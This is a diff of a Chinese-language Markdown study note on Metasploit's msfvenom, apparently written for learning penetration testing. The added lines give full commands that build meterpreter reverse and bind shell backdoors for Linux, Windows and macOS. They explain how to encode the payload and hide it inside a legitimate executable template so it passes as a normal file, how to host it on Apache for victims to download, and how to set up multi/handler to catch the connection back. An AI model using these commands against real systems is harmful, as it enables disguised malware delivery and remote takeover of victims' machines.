@@ -126,16 +126,72 @@ save -> 將當前設置值保存下來，以便下次啟動MSF終端時仍可使
 + 用來生成後門的軟件，在目標機上執行後門，在本地監聽上線
 
 ```diff
--p : --payload,指定特定的payload 如果被設置為 - 那麼從標準輸入流中讀取
+-p : --payload,指定特定的payload 如果被設置為 - 那麼從標準輸入流中讀取,幾乎支援所有系統平台
 -l : --list 列出所有可用的項目 其中值可以被設置為 payload,encoders,nops,all
 -n : --nopsled 指定nop在payload中的數量
--f : --format 指定payload的輸出格式(--list formats : 列出所有可用的輸出格式)
+-f : --format 指定payload的輸出格式(.exe、.sh..)(--list formats : 列出所有可用的輸出格式)
 -e : --encoder，指定使用的encoder
 -a : --arch 指定目標系統架構
 --platform : 指定目標系統平台
 -s : --space 設置未經編碼的payload最大長度(--encoder-space:編碼後的payload的最大長度)
+-b : --bad-chars 設置需要在payload中避免出現的字符 EX:'\0f'、'\x00'
+-i : iterations 設置payload的編碼次數
+--smallest : 盡可能生成最短payload
+-o : --out 保存payload文件
+-c : --add-code 指定一個附加的win32 shellcode 文件
+-x : --template 指定一個特定的可執行文件作為模板
+-k : --keep 保護模板程序的功能 注入payload作為一個新的進程運行
 ```
 
++ linux **(LHOST 跟 LPORT 是對當前選擇的payload設置要回連的地址及端口去做設置)**
+  + msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f elf > shell.elf  (反向連接模塊 目標主機主動來連本地主機)
+  + msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=<Target IP Address> LPORT=<Port to connect ON> -f elf > shell.elf (本地主機主動連接目標主機)
+
++ windows
+  + msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f exe > shell.exe 
+  + msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.xx.xxx LPORT=xxxx -x /root/Desktop/StampRemover.exe -e x86/shikata_ga_nai -f exe -o /var/www/html/heello.exe
+
+ **x86/shikata_ga_nai:等級為excellent ; 解碼跟編碼過程都是隨機生成的** 
+![image](https://user-images.githubusercontent.com/96654161/170610208-3347eff2-359e-48c9-a9e3-04a5f46a2e81.png)
+> 看到 cmd/powershell_base64   excellent  Powershell Base64 Command Encoder
+> x86/shikata_ga_nai      excellent  Polymorphic XOR Additive Feedback En
+>只有這兩個encoder是excellent
+
+>-x /root/Desktop/StampRemover.exe 如果沒指定模板文件，預設執行檔icon會是一般的執行檔樣式，有指定模板文件的話，除了icon會一樣，文件大小也會差不多，較能成功偽裝正常文件。/root/Desktop/StampRemover.exe是模板文件位置
+>![image](https://user-images.githubusercontent.com/96654161/170607393-4a3fb9da-cd0e-4b5b-9a98-1816ff65b26e.png)
+
+  
+![image](https://user-images.githubusercontent.com/96654161/170606643-4847649d-a271-4b68-b3f1-671803cfb893.png)
+  
+>通常存到/var/www/html底下，外部機器想要下載的話，需要用service apache2 start
+>![image](https://user-images.githubusercontent.com/96654161/170607020-c3911031-6915-41b8-997b-df410fe232c0.png)
+
+  
++ 在被攻擊機器上下載好payload後，在本地msfconsole測試是否可成功回連
+  + use exploit/multi/handler 該模塊是一個有效負載處理程序，他只處理在受損主機中執行的有效負載連接
+  + options
+  + set payload windows/meterpreter/reverse_tcp (這裡設置的payload要跟msfvenom設置的payload一樣)
+ ![image](https://user-images.githubusercontent.com/96654161/170608676-f9d6480f-749e-4088-a9d1-18580305043f.png)
+  + options 
+  + set lhosts ip address(這裡的ip要跟msfvenom設置的一樣)
+  + set lport port(這裡的port要跟msfvenom設置的一樣)
+  + run
+![image](https://user-images.githubusercontent.com/96654161/170609024-8da25c58-3b6b-4f84-9b3a-3fcecc249ac0.png)
+  
+>運行成功的話，會在被攻擊機上成功執行該payload，可以在工作管理員查看
+  ![image](https://user-images.githubusercontent.com/96654161/170609271-ac65f0d2-90f1-4b8d-8fdd-b4045ecc8af6.png)
+
+
+  
+  
+  
+  
+ 
+
++ mac
+  + msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f macho > shell.macho
+  
+  
 
 <!---
 XXE 
